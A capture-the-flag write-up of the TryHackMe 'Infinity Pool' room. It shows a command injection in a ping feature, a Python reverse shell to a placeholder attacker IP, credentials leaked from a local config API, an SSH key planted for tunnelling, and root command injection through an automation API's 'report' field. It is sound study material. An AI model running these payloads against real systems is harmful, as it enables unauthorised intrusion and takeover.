Written By Aryan Giri

**Room:** Infinity Pool
**Category:** Boot2Root
**Difficulty:** Medium
**Points:** 90
**Platform:** TryHackMe
**Room URL:** https://tryhackme.com/room/hh-infinitypool-5b3548af

## Concierge Briefing

> No visible edge. You trace the network to the horizon and find three systems nobody told you about on the other side.

The objective is straightforward:

* Find the user flag
* Find the root flag

The interesting part is how the attack chain develops. Initial access comes from command injection in a web application, while privilege escalation requires discovering services that are only reachable from the target itself.

---

## Initial Web Enumeration

The target machine provided by the room was:

```text
http://10.49.175.103
```

I started by opening the web application in a browser.

<img width="1274" height="753" alt="Screenshot 2026-08-07 211141" src="https://github.com/user-attachments/assets/29a9064d-2297-41fb-9381-c839534a9045" />


There was not much visible functionality, so the next step was source-code reconnaissance.

Looking through the webpage source revealed an interesting reference to an `app.py` file.

<img width="626" height="121" alt="Screenshot 2026-08-07 211212" src="https://github.com/user-attachments/assets/0aca9be6-2a39-4f9f-9687-f2ba92eacc4c" />
<img width="741" height="214" alt="Screenshot 2026-08-07 211227" src="https://github.com/user-attachments/assets/5e78086a-a66f-487d-95ef-a8d56660d35c" />


The application exposed endpoints including:

```text
/status
/internal/netcheck
```

The `/internal/netcheck` endpoint returned `Method Not Allowed` when accessed directly, while `/status` exposed functionality that allowed an IP address to be supplied for a ping operation.

---

## Command Injection

The ping functionality immediately looked interesting.

<img width="1264" height="713" alt="Screenshot 2026-08-07 211403" src="https://github.com/user-attachments/assets/d1f8de6b-765a-4af8-be3c-7d58be9dba85" />


Instead of supplying only an IP address, I tested whether additional shell syntax would be interpreted.

For example:

```text
127.0.0.1 ; pwd
```

The application executed the additional command and returned the working directory.

<img width="889" height="659" alt="Screenshot 2026-08-07 211843" src="https://github.com/user-attachments/assets/7f60871d-431a-478e-8182-ef1eb3767370" />



This confirmed command injection and, more importantly, revealed the filesystem location from which the web application was running.

At this point, the goal changed from web enumeration to obtaining interactive access to the underlying system.

---

## EscapeArtist

While testing command-injection payloads, I also used one of my older utilities, [EscapeArtist](https://giriaryan694-a11y.github.io/EscapeArtist/).

EscapeArtist is a client-side utility for security researchers, penetration testers, and CTF players that dynamically generates command-injection bypass payloads based on the target command, allowed values, and shell environment.

<img width="1736" height="933" alt="Screenshot 2026-08-07 211653" src="https://github.com/user-attachments/assets/6981967f-a285-455b-8559-3e3bfc520d1d" />


For example, if the allowed input is:

```text
127.0.0.1
```

and the command I want to execute is:

```text
pwd
```

EscapeArtist can generate a collection of syntactically valid payload variations.

<img width="1680" height="935" alt="Screenshot 2026-08-07 211746" src="https://github.com/user-attachments/assets/b57b4612-565f-4d65-8bc5-0b03c12b4591" />


Generated payloads:

<img width="1625" height="946" alt="Screenshot 2026-08-07 211806" src="https://github.com/user-attachments/assets/721e5c02-7818-4aaa-a149-35747d07ff1e" />


For this room, however, the basic command injection was already sufficient.

---

## Getting a Reverse Shell

Technology reconnaissance showed that the web application was running behind Gunicorn, indicating a Python-based web service.

Since arbitrary commands could already be executed, I used a Python reverse shell to obtain a proper interactive connection.

First, start a listener on the attacking machine:

```bash
nc -lvnp <LISTEN_PORT>
```

Then execute the reverse-shell command through the vulnerable parameter:

```bash
127.0.0.1 | python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("<ATTACKER_IP>",<LISTEN_PORT>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash","-i"])'
```

<img width="823" height="359" alt="Screenshot 2026-08-07 220056" src="https://github.com/user-attachments/assets/c3c0fbb4-a164-4843-ad7e-77251f4c3534" />


The connection came back to the listener.

<img width="638" height="191" alt="Screenshot 2026-08-07 220106" src="https://github.com/user-attachments/assets/81dac825-8c71-45c2-a7f3-797d1f04eab9" />


A proper PTY could be configured at this point, but for this room I only needed enough shell functionality to continue enumeration.

---

## User Flag

After obtaining the shell, I navigated to the user's home directory and checked the flag file:

```bash
cd
cat user.txt
```

<img width="562" height="233" alt="Screenshot 2026-08-07 224358" src="https://github.com/user-attachments/assets/2e7d22da-d4ea-4495-9142-662cac5b1808" />


The user flag was successfully obtained.

The flag itself is omitted because of TryHackMe's room-content rules.

---

# Privilege Escalation

Getting the user shell was only the beginning.

Traditional privilege-escalation enumeration did not immediately reveal an obvious path to root, so I started looking at local services.

One of the most useful commands here was:

```bash
ss -tuln
```

<img width="642" height="599" alt="Screenshot 2026-08-08 142217" src="https://github.com/user-attachments/assets/8d7b49ea-f41f-47f3-bc66-ebaf2c9bc49d" />


The output showed several TCP and UDP services, including services bound only to localhost.

This was the important clue.

Services listening on:

```text
127.0.0.1
```

cannot normally be reached directly from the attacking machine.

The internal architecture eventually revealed three important services:

```text
127.0.0.1:3000
    Watchtower
    Configuration API

127.0.0.1:8080
    Apache / FreePBX UCP

127.0.0.1:9000
    Automation service
```

There was also an Asterisk AMI service listening locally on port `5038`.

The attack path therefore became:

```text
Command Injection
        |
        v
Reverse Shell
        |
        v
Local Service Enumeration
        |
        v
Watchtower Configuration Leak
        |
        v
FreePBX UCP
        |
        v
Automation Key
        |
        v
Automation API
        |
        v
Command Injection as root
        |
        v
Root Flag
```

---

## Enumerating the Internal Web Services

I first checked the HTTP services from the compromised machine.

For example:

```bash
curl -s -I http://127.0.0.1:8080/ucp
```

The service on port `8080` returned a redirect, indicating that this was the Apache/FreePBX service.

<img width="556" height="241" alt="Screenshot 2026-08-08 142427" src="https://github.com/user-attachments/assets/ae7fb790-c63c-4d35-a9ef-a95aaad615a1" />


There was also an HTTP service on another local port, but it was the raw Asterisk HTTP server rather than the FreePBX UCP interface.

The key point was that the interesting services were intentionally inaccessible from outside the machine.

---

# Harvesting Credentials from Watchtower

The service on port `3000` exposed a configuration API.

I queried it with:

```bash
curl -s http://127.0.0.1:3000/api/config
```

<img width="724" height="99" alt="Screenshot 2026-08-08 142307" src="https://github.com/user-attachments/assets/d6653e95-c475-4f3b-aa11-024d518fdb55" />


The response disclosed credentials for the FreePBX UCP application:

```text
User: FreePBXUCPTemplateCreator
Pass: $t4yN0t1c3d_2026
```

These credentials were important because they allowed access to the internal FreePBX interface.

---

# Reaching Localhost Services with SSH Port Forwarding

The FreePBX UCP service was listening internally on the target, so accessing it directly from the attacking machine was not possible.

This is where SSH local port forwarding becomes useful.

First, I generated an RSA key on the attacking machine:

```bash
ssh-keygen -t rsa -b 2048 -f ~/.ssh/infinity_pool_key -N ""
```

The public key can be displayed again if the terminal has been cleared:

```bash
cat ~/.ssh/infinity_pool_key.pub
```

From the existing shell on the target, I created the SSH directory if necessary:

```bash
mkdir -p ~/.ssh
```

Then added the attacker's public key:

```bash
echo "ssh-rsa <PASTE_YOUR_PUBLIC_KEY_HERE>" >> ~/.ssh/authorized_keys
```

<img width="1312" height="615" alt="Screenshot 2026-08-08 140943" src="https://github.com/user-attachments/assets/993ac99b-91b9-4b13-bd94-0b52314838cf" />

This allowed me to establish an SSH connection using the generated key.

---

## Creating the SSH Tunnel

From the attacking machine:

```bash
ssh -i ~/.ssh/infinity_pool_key -L 8080:127.0.0.1:8080 web@10.48.147.49
```

The important part is:

```text
-L 8080:127.0.0.1:8080
```

This maps:

```text
Attacker localhost:8080
        |
        v
SSH tunnel
        |
        v
Target 127.0.0.1:8080
```

<img width="623" height="193" alt="Screenshot 2026-08-08 142610" src="https://github.com/user-attachments/assets/94774a44-1407-49c9-8307-0f6d6823ccb4" />


Now the internal FreePBX service could be accessed through the attacker's own browser.

---

# Accessing FreePBX UCP

With the tunnel active, I opened:

```text
http://127.0.0.1:8080/ucp
```

<img width="1426" height="862" alt="Screenshot 2026-08-08 142640" src="https://github.com/user-attachments/assets/c56495d1-08df-4af5-b622-89b27fdf56a7" />


The page took some time to load.

A useful way to verify that the tunnel itself is working is to open:

```text
http://127.0.0.1:8080
```

This returned the Ubuntu default webpage immediately.

If that page works but UCP takes longer to load, the SSH tunnel itself is probably functioning correctly.

The UCP login page requested credentials.

I used the credentials discovered from Watchtower:

```text
Username:
FreePBXUCPTemplateCreator

Password:
$t4yN0t1c3d_2026
```

<img width="740" height="405" alt="Screenshot 2026-08-08 142811" src="https://github.com/user-attachments/assets/dfcf1fc1-705d-4649-9bc2-34de51067cb4" />


After authentication, the UCP interface loaded.

<img width="437" height="453" alt="Screenshot 2026-08-08 142848" src="https://github.com/user-attachments/assets/f0e7e4a1-33d3-4b7d-92f8-e6ef720db388" />


A short setup guide appeared. I proceeded through it until reaching the main dashboard.

---

# Finding the Automation Key

The UCP interface contained dashboard functionality.

There were two `+` buttons, one on the left and another on the right.
<img width="1919" height="352" alt="Screenshot 2026-08-08 143246" src="https://github.com/user-attachments/assets/16090c13-45de-4da9-85c5-e140653abd2c" />


The Left-side `+` was the one needed to create a dashboard.

I created a dashboard named:

```text
tester
```

<img width="665" height="279" alt="Screenshot 2026-08-08 143304" src="https://github.com/user-attachments/assets/c79dac72-c6d4-4291-9a3e-1faad5e97ae1" />


Next, I used the right-side `+` to add a widget.

<img width="1028" height="308" alt="Screenshot 2026-08-08 143319" src="https://github.com/user-attachments/assets/64e7be51-35aa-4db8-a912-6f6c7728e254" />


From the available widgets, I selected the voicemail widget.

<img width="686" height="757" alt="Screenshot 2026-08-08 143330" src="https://github.com/user-attachments/assets/d1d73b59-7de3-4330-9a7f-75518447a85c" />


After adding it, the voicemail information appeared in the dashboard.

<img width="1060" height="482" alt="Screenshot 2026-08-08 143435" src="https://github.com/user-attachments/assets/3d4260f7-1de8-4b32-97cf-0c65de142475" />


The important information was in the **Caller ID** field.

The Caller ID contained an automation key resembling:

```text
cc_auto_...
```

I copied this key because it was required to interact with the internal automation service.

---

# Exploiting the Automation Service

The final internal service was listening on:

```text
127.0.0.1:9000
```

The discovered automation key could be supplied as a Bearer token.

First, I stored the key in a shell variable:

```bash
KEY='<YOUR_AUTOMATION_KEY>'
```

The service exposed an export endpoint:

```text
POST /jobs/export
```

I tested whether the `report` parameter was safely handled.

The parameter was vulnerable to command injection.

Since the export job executed with root privileges, command injection here provided a path from the existing user context to root.

To retrieve the root flag:

```bash
curl -s -X POST \
-H "Authorization: Bearer $KEY" \
-H "Content-Type: application/json" \
http://127.0.0.1:9000/jobs/export \
-d '{"report":"test; cat /root/root.txt;"}'
```

<img width="1617" height="842" alt="Screenshot 2026-08-08 143656" src="https://github.com/user-attachments/assets/19208481-8bfc-4011-89f7-585e79f7ddfd" />



The response contained the root flag.

The flag is omitted because of TryHackMe's room-content rules.

---

# Attack Chain

The complete compromise can be summarized as:

```text
Internet-facing web application
            |
            v
Source-code reconnaissance
            |
            v
/status ping functionality
            |
            v
Command Injection
            |
            v
Python Reverse Shell
            |
            v
Local enumeration with ss
            |
            v
127.0.0.1:3000 Watchtower
            |
            v
FreePBX credentials
            |
            v
SSH local port forwarding
            |
            v
FreePBX UCP
            |
            v
Voicemail widget
            |
            v
Automation Key
            |
            v
127.0.0.1:9000
            |
            v
/jobs/export command injection
            |
            v
Root execution
            |
            v
/root/root.txt
```

## Lessons from the Room

Infinity Pool was less about finding a single vulnerability and more about chaining several weaknesses together.

The first major issue was command injection in the web application's ping functionality. A feature intended to perform a simple network diagnostic allowed attacker-controlled shell commands to reach the underlying operating system.

The second important discovery was that localhost-only services should not be ignored. Binding an application to `127.0.0.1` prevents direct remote access, but it does not make the service inherently secure. Once an attacker obtains shell access, those services become part of the attack surface.

The Watchtower configuration endpoint demonstrated another common failure: sensitive credentials exposed through an internal configuration API.

SSH port forwarding then provided a clean way to reach an otherwise inaccessible service:

```text
Attacker -> SSH -> Target localhost service
```

The FreePBX interface ultimately exposed an automation credential, which became the bridge to the final privilege-escalation stage.

Finally, the automation service trusted a user-controlled `report` value while executing an export operation as root. That turned a seemingly ordinary API parameter into a root-level command-execution primitive.

The most important lesson from the room is therefore the attack-chain mindset:

```text
Initial RCE
    +
Internal service discovery
    +
Credential exposure
    +
Local service access
    +
Application-level token
    +
Privileged command injection
    =
Full system compromise
```

A service being hidden behind localhost is not the same thing as being secure. Once an attacker gets execution on the host, the entire internal service topology becomes part of the reachable attack surface.
